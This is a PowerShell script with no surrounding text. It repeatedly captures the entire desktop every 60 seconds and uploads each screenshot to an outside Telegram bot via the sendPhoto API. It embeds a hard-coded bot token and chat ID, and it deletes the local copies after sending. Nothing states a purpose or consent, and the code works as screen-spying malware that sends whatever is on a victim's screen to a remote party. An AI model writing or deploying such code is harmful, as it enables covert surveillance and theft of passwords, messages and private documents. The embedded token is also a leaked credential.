

# Make PowerShell DPI-aware before accessing screen information
Add-Type @"
using System;
using System.Runtime.InteropServices;

public static class DPIHelper {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@

[DPIHelper]::SetProcessDPIAware()

# =========================
# TELEGRAM DETAILS
# =========================
$BotToken = "8536412827:AAGOLOHWcfZj2lAI-gNVLPGEDdMCoHJusew"
$ChatId   = "6527981858"

# =========================
# LOG FILE
# =========================
$LogFile = "C:\Scripts\output.log"

while ($true) {

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $file = Join-Path $env:TEMP "desktop_$([guid]::NewGuid()).jpg"

    try {

        # =========================
        # GET ENTIRE VIRTUAL DESKTOP
        # =========================
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen

        "$timestamp - Screen: X=$($screen.X), Y=$($screen.Y), Width=$($screen.Width), Height=$($screen.Height)" |
            Out-File $LogFile -Append

        # =========================
        # CREATE SCREENSHOT
        # =========================
        $bitmap = New-Object System.Drawing.Bitmap(
            $screen.Width,
            $screen.Height
        )

        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)

        $graphics.CopyFromScreen(
            $screen.X,
            $screen.Y,
            0,
            0,
            $bitmap.Size,
            [System.Drawing.CopyPixelOperation]::SourceCopy
        )

        $bitmap.Save(
            $file,
            [System.Drawing.Imaging.ImageFormat]::Jpeg
        )

        $graphics.Dispose()
        $bitmap.Dispose()

        "$timestamp - Screenshot created: $file" |
            Out-File $LogFile -Append

        # =========================
        # TELEGRAM MULTIPART UPLOAD
        # =========================
        $boundary = [guid]::NewGuid().ToString()
        $LF = "`r`n"

        $body = New-Object System.IO.MemoryStream

        $writer = New-Object System.IO.StreamWriter(
            $body,
            [System.Text.Encoding]::UTF8,
            1024,
            $true
        )

        # Chat ID
        $writer.Write("--$boundary$LF")
        $writer.Write(
            "Content-Disposition: form-data; name=`"chat_id`"$LF$LF"
        )
        $writer.Write("$ChatId$LF")

        # Photo
        $writer.Write("--$boundary$LF")
        $writer.Write(
            "Content-Disposition: form-data; name=`"photo`"; filename=`"screenshot.jpg`"$LF"
        )
        $writer.Write("Content-Type: image/jpeg$LF$LF")
        $writer.Flush()

        $imageBytes = [System.IO.File]::ReadAllBytes($file)

        $body.Write(
            $imageBytes,
            0,
            $imageBytes.Length
        )

        $writer.Write("$LF--$boundary--$LF")
        $writer.Flush()

        # =========================
        # SEND REQUEST
        # =========================
        $request = [System.Net.WebRequest]::Create(
            "https://api.telegram.org/bot$BotToken/sendPhoto"
        )

        $request.Method = "POST"
        $request.ContentType =
            "multipart/form-data; boundary=$boundary"

        $data = $body.ToArray()

        $request.ContentLength = $data.Length

        $stream = $request.GetRequestStream()

        $stream.Write(
            $data,
            0,
            $data.Length
        )

        $stream.Close()

        # =========================
        # READ TELEGRAM RESPONSE
        # =========================
        $response = $request.GetResponse()

        $reader = New-Object System.IO.StreamReader(
            $response.GetResponseStream()
        )

        $result = $reader.ReadToEnd()

        "$timestamp - Telegram: $result" |
            Out-File $LogFile -Append

        $reader.Close()
        $response.Close()
        $body.Dispose()

        # =========================
        # DELETE TEMP FILE
        # =========================
        Remove-Item $file -Force -ErrorAction SilentlyContinue

        Write-Host "$timestamp - Screenshot sent successfully."

    }
    catch {

        "$timestamp - ERROR: $($_.Exception.Message)" |
            Out-File $LogFile -Append

        Write-Host "ERROR: $($_.Exception.Message)"
    }

    Write-Host "Waiting 60 seconds..."

    Start-Sleep -Seconds 60
}
